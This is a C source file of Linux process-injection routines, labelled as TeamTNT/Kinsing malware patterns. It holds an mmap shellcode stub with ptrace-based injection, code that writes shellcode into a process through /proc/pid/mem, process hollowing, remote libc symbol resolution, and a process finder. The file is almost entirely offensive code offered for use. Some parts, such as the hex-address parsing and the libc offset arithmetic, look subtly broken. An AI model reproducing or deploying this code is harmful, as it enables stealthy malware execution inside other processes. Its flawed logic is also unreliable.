/*
 * Linux Process Injection
 * TeamTNT/Kinsing patterns
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <fcntl.h>
#include <dlfcn.h>

// ============================================================================
// MMAP SHELLCODE - Stub for ptrace injection
// ============================================================================

unsigned char sc_mmap[] = {
    0x48, 0xc7, 0xc0, 0x09, 0x00, 0x00, 0x00,  // mov rax, 9
    0x48, 0x31, 0xff,                          // xor rdi, rdi
    0x48, 0xc7, 0xc6, 0x00, 0x10, 0x00, 0x00,  // mov rsi, 0x1000
    0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00,  // mov rdx, 7
    0x49, 0xc7, 0xc2, 0x22, 0x00, 0x00, 0x00,  // mov r10, 0x22
    0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff,  // mov r8, -1
    0x4d, 0x31, 0xc9,                          // xor r9, r9
    0x0f, 0x05,                                // syscall
    0xcc                                       // int3
};

// ============================================================================
// PTRACE INJECT
// ============================================================================

int pt_inject(int pid, unsigned char* sc, unsigned long len)
{
    struct user_regs_struct regs, saved;

    if(ptrace(0, pid, 0, 0) < 0) return -1;  // PTRACE_ATTACH
    waitpid(pid, 0, 0);

    ptrace(12, pid, 0, &saved);  // PTRACE_GETREGS

    unsigned long orig[8];
    for(int i = 0; i < 8; i++)
        orig[i] = ptrace(1, pid, saved.rip + i*8, 0);  // PTRACE_PEEKTEXT

    for(int i = 0; i < (sizeof(sc_mmap) + 7) / 8; i++) {
        unsigned long w = *(unsigned long*)(sc_mmap + i*8);
        ptrace(4, pid, saved.rip + i*8, w);  // PTRACE_POKETEXT
    }

    ptrace(7, pid, 0, 0);  // PTRACE_CONT
    waitpid(pid, 0, 0);

    ptrace(12, pid, 0, &regs);
    unsigned long addr = regs.rax;

    for(int i = 0; i < (len + 7) / 8; i++) {
        unsigned long w = 0;
        unsigned char* s = sc + i*8;
        unsigned char* d = (unsigned char*)&w;
        for(int j = 0; j < 8 && i*8+j < len; j++) d[j] = s[j];
        ptrace(4, pid, addr + i*8, w);
    }

    for(int i = 0; i < 8; i++)
        ptrace(4, pid, saved.rip + i*8, orig[i]);

    saved.rip = addr;
    ptrace(13, pid, 0, &saved);  // PTRACE_SETREGS
    ptrace(17, pid, 0, 0);       // PTRACE_DETACH

    return 0;
}

// ============================================================================
// /proc/pid/mem INJECT
// ============================================================================

int mem_inject(int pid, unsigned char* sc, unsigned long len)
{
    char p[64];
    char* s = p;
    char* fmt = "/proc/";
    while(*fmt) *s++ = *fmt++;

    int t = pid, d = 1;
    while(t >= 10) { d *= 10; t /= 10; }
    t = pid;
    while(d) { *s++ = '0' + (t/d); t %= d; d /= 10; }

    fmt = "/mem";
    while(*fmt) *s++ = *fmt++;
    *s = 0;

    int fd = open(p, 2);  // O_RDWR
    if(fd < 0) return -1;

    // Find executable region
    s = p;
    fmt = "/proc/";
    while(*fmt) *s++ = *fmt++;
    t = pid; d = 1;
    while(t >= 10) { d *= 10; t /= 10; }
    t = pid;
    while(d) { *s++ = '0' + (t/d); t %= d; d /= 10; }
    fmt = "/maps";
    while(*fmt) *s++ = *fmt++;
    *s = 0;

    int mfd = open(p, 0);
    if(mfd < 0) { close(fd); return -1; }

    char buf[4096];
    int n = read(mfd, buf, sizeof(buf)-1);
    close(mfd);
    buf[n] = 0;

    unsigned long addr = 0;
    char* c = buf;
    while(*c) {
        unsigned long a = 0;
        while(*c >= '0' && *c <= '9') { a = a*16 + *c - '0'; c++; }
        while(*c >= 'a' && *c <= 'f') { a = a*16 + *c - 'a' + 10; c++; }

        while(*c && *c != ' ') c++;
        c++;
        if(c[2] == 'x') { addr = a; break; }
        while(*c && *c != '\n') c++;
        if(*c) c++;
    }

    if(!addr) { close(fd); return -1; }

    ptrace(0, pid, 0, 0);  // PTRACE_ATTACH
    waitpid(pid, 0, 0);

    lseek(fd, addr, 0);
    write(fd, sc, len);
    close(fd);

    struct user_regs_struct regs;
    ptrace(12, pid, 0, &regs);
    regs.rip = addr;
    ptrace(13, pid, 0, &regs);
    ptrace(17, pid, 0, 0);

    return 0;
}

// ============================================================================
// PROCESS HOLLOW
// ============================================================================

int hollow(const char* target, unsigned char* payload, unsigned long len)
{
    int pid = fork();
    if(pid == 0) {
        ptrace(0, 0, 0, 0);  // PTRACE_TRACEME
        char* av[] = {(char*)target, 0};
        execve(target, av, 0);
        _exit(1);
    }

    waitpid(pid, 0, 0);

    char p[64];
    char* s = p;
    char* fmt = "/proc/";
    while(*fmt) *s++ = *fmt++;
    int t = pid, d = 1;
    while(t >= 10) { d *= 10; t /= 10; }
    t = pid;
    while(d) { *s++ = '0' + (t/d); t %= d; d /= 10; }
    fmt = "/maps";
    while(*fmt) *s++ = *fmt++;
    *s = 0;

    int fd = open(p, 0);
    char buf[256];
    read(fd, buf, 255);
    close(fd);

    unsigned long base = 0;
    char* c = buf;
    while(*c >= '0' && *c <= '9') { base = base*16 + *c - '0'; c++; }
    while(*c >= 'a' && *c <= 'f') { base = base*16 + *c - 'a' + 10; c++; }

    for(int i = 0; i < (len + 7) / 8; i++) {
        unsigned long w = 0;
        unsigned char* src = payload + i*8;
        unsigned char* dst = (unsigned char*)&w;
        for(int j = 0; j < 8 && i*8+j < len; j++) dst[j] = src[j];
        ptrace(4, pid, base + i*8, w);
    }

    struct user_regs_struct regs;
    ptrace(12, pid, 0, &regs);
    regs.rip = base;
    ptrace(13, pid, 0, &regs);
    ptrace(17, pid, 0, 0);

    return pid;
}

// ============================================================================
// FIND LIBC FUNC
// ============================================================================

unsigned long find_libc(int pid, const char* func)
{
    char p[64];
    char* s = p;
    char* fmt = "/proc/";
    while(*fmt) *s++ = *fmt++;
    int t = pid, d = 1;
    while(t >= 10) { d *= 10; t /= 10; }
    t = pid;
    while(d) { *s++ = '0' + (t/d); t %= d; d /= 10; }
    fmt = "/maps";
    while(*fmt) *s++ = *fmt++;
    *s = 0;

    int fd = open(p, 0);
    if(fd < 0) return 0;

    char buf[4096];
    int n = read(fd, buf, sizeof(buf)-1);
    close(fd);
    buf[n] = 0;

    unsigned long base = 0;
    char* c = buf;
    while(*c) {
        if(c[0]=='l' && c[1]=='i' && c[2]=='b' && c[3]=='c') {
            // Go back to start of line
            while(c > buf && *(c-1) != '\n') c--;
            while(*c >= '0' && *c <= '9') { base = base*16 + *c - '0'; c++; }
            while(*c >= 'a' && *c <= 'f') { base = base*16 + *c - 'a' + 10; c++; }
            break;
        }
        c++;
    }

    if(!base) return 0;

    void* h = dlopen("libc.so.6", 2);
    void* f = dlsym(h, func);
    void* b = dlopen(0, 2);

    return base + ((unsigned long)f - (unsigned long)h);
}

// ============================================================================
// SHARED MEMORY INJECTION
// ============================================================================

/*
 * 1. shm_open("/X", O_CREAT|O_RDWR, 0600)
 * 2. ftruncate(fd, len)
 * 3. mmap(0, len, PROT_RWX, MAP_SHARED, fd, 0)
 * 4. Write shellcode
 * 5. Inject via ptrace: target calls shm_open + mmap + jump
 */

// ============================================================================
// FIND PROC BY NAME
// ============================================================================

int find_proc(const char* name)
{
    for(int pid = 1; pid < 65536; pid++) {
        char p[64];
        char* s = p;
        char* fmt = "/proc/";
        while(*fmt) *s++ = *fmt++;
        int t = pid, d = 1;
        while(t >= 10) { d *= 10; t /= 10; }
        t = pid;
        while(d) { *s++ = '0' + (t/d); t %= d; d /= 10; }
        fmt = "/comm";
        while(*fmt) *s++ = *fmt++;
        *s = 0;

        int fd = open(p, 0);
        if(fd < 0) continue;

        char buf[64];
        int n = read(fd, buf, 63);
        close(fd);
        if(n <= 0) continue;
        buf[n-1] = 0;  // Remove newline

        const char* a = buf;
        const char* b = name;
        while(*a && *b && *a == *b) { a++; b++; }
        if(!*a && !*b) return pid;
    }
    return 0;
}

// ============================================================================
// EOF
// ============================================================================
